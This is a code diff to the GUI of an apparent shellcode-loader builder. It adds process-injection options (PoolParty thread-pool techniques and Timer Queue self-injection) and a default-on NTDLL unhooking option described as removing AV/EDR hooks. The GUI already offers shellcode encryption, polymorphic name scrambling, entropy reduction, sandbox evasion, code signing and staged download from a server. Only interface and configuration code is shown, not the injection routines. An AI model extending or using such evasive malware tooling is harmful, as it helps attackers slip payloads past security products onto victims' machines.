@@ -197,7 +197,11 @@ class StagedTab(QWidget):
         form.addRow("Format:", self._format_combo)
 
         self._inject_combo = QComboBox()
-        self._inject_combo.addItems(["apc", "copyfile2"])
+        self._inject_combo.addItem("apc",                 "apc")
+        self._inject_combo.addItem("copyfile2",           "copyfile2")
+        self._inject_combo.addItem("Threadpool (TP_DIRECT)",    "tp_direct")
+        self._inject_combo.addItem("Threadpool (WF Overwrite)", "wf_overwrite")
+        self._inject_combo.addItem("Timer Queue (callback)",    "timerqueue")
         self._inject_combo.setMinimumWidth(140)
         form.addRow("Injection:", self._inject_combo)
 
@@ -257,10 +261,12 @@ class StagedTab(QWidget):
 
         self._encrypt_check = QCheckBox("Encrypt shellcode (AES-128-CBC)")
         self._scramble_check = QCheckBox("Scramble functions and variables")
+        self._unhook_check = QCheckBox("NTDLL unhooking (Known DLLs)")
+        self._unhook_check.setChecked(True)
         self._entropy_check = QCheckBox("Entropy reduction (embed English text)")
         self._sandbox_check = QCheckBox("Sandbox checks")
         for check in (self._encrypt_check, self._scramble_check,
-                      self._entropy_check, self._sandbox_check):
+                      self._unhook_check, self._entropy_check, self._sandbox_check):
             layout.addWidget(check)
 
         self._sb_thresh_row = QWidget()
@@ -403,8 +409,11 @@ class StagedTab(QWidget):
         self._payload_edit.setToolTip("Path to raw shellcode .bin file (drag & drop supported)")
         self._format_combo.setToolTip("EXE: standalone executable | DLL: dynamic library for injection")
         self._inject_combo.setToolTip(
-            "APC: Queue APC to suspended process (stealthier)\n"
-            "CopyFile2: Execute via CopyFile2 progress callback (no target process needed)")
+            "apc: EarlyBird APC into suspended process\n"
+            "copyfile2: CopyFile2 progress callback (self-injection)\n"
+            "Threadpool (TP_DIRECT): PoolParty — ZwSetIoCompletion via IoCompletion handle (existing process)\n"
+            "Threadpool (WF Overwrite): PoolParty — overwrite WorkerFactory StartRoutine (existing process)\n"
+            "Timer Queue (callback): CreateTimerQueueTimer self-injection — shellcode runs on thread pool (current process)")
         self._target_combo.setToolTip("Process to inject into via APC (only used with APC injection)")
         self._ip_edit.setToolTip("IP/hostname of shellcode download server")
         self._port_spin.setToolTip("Port of shellcode download server")
@@ -413,6 +422,7 @@ class StagedTab(QWidget):
         self._ua_edit.setToolTip("User-Agent header for HTTP/HTTPS download request")
         self._encrypt_check.setToolTip("Encrypt shellcode with AES-128-CBC (key/IV embedded in loader)")
         self._scramble_check.setToolTip("Randomize function/variable names and optimization level for polymorphism")
+        self._unhook_check.setToolTip("Remap a clean copy of NTDLL from KnownDlls, removing any userland hooks set by AV/EDR")
         self._entropy_check.setToolTip("Embed English text in loader to reduce entropy")
         self._sandbox_check.setToolTip("Check uptime, RAM, and CPU count before executing — exits cleanly if a sandbox is detected")
         self._pfx_edit.setToolTip("PFX certificate file for code signing (EXE only, drag & drop supported)")
@@ -426,9 +436,9 @@ class StagedTab(QWidget):
         QShortcut(QKeySequence("Ctrl+S"), self, self._save_profile)
 
     def _connect_adaptive(self):
-        self._inject_combo.currentTextChanged.connect(self._on_inject_changed)
+        self._inject_combo.currentIndexChanged.connect(lambda _: self._on_inject_changed(self._inject_combo.currentData()))
         self._format_combo.currentTextChanged.connect(self._on_format_changed)
-        self._on_inject_changed(self._inject_combo.currentText())
+        self._on_inject_changed(self._inject_combo.currentData())
         self._on_format_changed(self._format_combo.currentText())
 
     def _on_inject_changed(self, method: str):
@@ -501,7 +511,7 @@ class StagedTab(QWidget):
             mode="staged",
             payload_path=self._payload_edit.text(),
             format=self._format_combo.currentText(),
-            inject_method=self._inject_combo.currentText(),
+            inject_method=self._inject_combo.currentData(),
             target_process=self._target_combo.currentText(),
             ip_address=self._ip_edit.text(),
             port=self._port_spin.value(),
@@ -510,6 +520,7 @@ class StagedTab(QWidget):
             user_agent=self._ua_edit.text(),
             encrypt=self._encrypt_check.isChecked(),
             scramble=self._scramble_check.isChecked(),
+            unhook=self._unhook_check.isChecked(),
             entropy_reduction=self._entropy_check.isChecked(),
             sandbox_checks=self._sandbox_check.isChecked(),
             sandbox_min_uptime_s=self._sb_uptime_spin.value(),
@@ -529,7 +540,7 @@ class StagedTab(QWidget):
     def _apply_config(self, config: BuildConfig):
         self._payload_edit.setText(config.payload_path)
         self._format_combo.setCurrentText(config.format)
-        self._inject_combo.setCurrentText(config.inject_method)
+        self._inject_combo.setCurrentIndex(next((i for i in range(self._inject_combo.count()) if self._inject_combo.itemData(i) == config.inject_method), 0))
         self._target_combo.setCurrentText(config.target_process)
         self._ip_edit.setText(config.ip_address)
         self._port_spin.setValue(config.port)
@@ -538,6 +549,7 @@ class StagedTab(QWidget):
         self._ua_edit.setText(config.user_agent)
         self._encrypt_check.setChecked(config.encrypt)
         self._scramble_check.setChecked(config.scramble)
+        self._unhook_check.setChecked(getattr(config, 'unhook', True))
         self._entropy_check.setChecked(getattr(config, 'entropy_reduction', False))
         self._sandbox_check.setChecked(getattr(config, 'sandbox_checks', False))
         self._sb_uptime_spin.setValue(getattr(config, 'sandbox_min_uptime_s', 300))
@@ -586,7 +598,7 @@ class StagedTab(QWidget):
             mode="staged",
             payload_path=self._payload_edit.text(),
             format=self._format_combo.currentText(),
-            inject_method=self._inject_combo.currentText(),
+            inject_method=self._inject_combo.currentData(),
             target_process=self._target_combo.currentText(),
             ip_address=self._ip_edit.text(),
             port=self._port_spin.value(),
@@ -595,6 +607,7 @@ class StagedTab(QWidget):
             user_agent=self._ua_edit.text(),
             encrypt=self._encrypt_check.isChecked(),
             scramble=self._scramble_check.isChecked(),
+            unhook=self._unhook_check.isChecked(),
             entropy_reduction=self._entropy_check.isChecked(),
             sandbox_checks=self._sandbox_check.isChecked(),
             sandbox_min_uptime_s=self._sb_uptime_spin.value(),
